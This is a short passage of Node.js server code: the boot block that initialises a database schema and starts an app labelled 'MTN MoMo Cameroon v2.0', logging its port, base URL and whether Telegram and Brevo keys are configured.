// ═══════════════════════════════════════════════════════════
// BOOT
// ═══════════════════════════════════════════════════════════
(async () => {
    try {
        await initSchema();
    } catch (err) {
        console.error('❌ Schema init failed:', err.message);
        process.exit(1);
    }
    app.listen(PORT, '0.0.0.0', () => {
        console.log('═══════════════════════════════════════');
        console.log(`🚀 MTN MoMo Cameroon v2.0`);
        console.log(`   Port: ${PORT}`);
        console.log(`   Base URL: ${APP_BASE_URL}`);
        console.log(`   Telegram: ${TG_TOKEN ? 'set' : 'MISSING'}`);
        console.log(`   Brevo: ${process.env.BREVO_API_KEY ? 'set' : 'MISSING'}`);
        console.log('═══════════════════════════════════════');
    });
})();
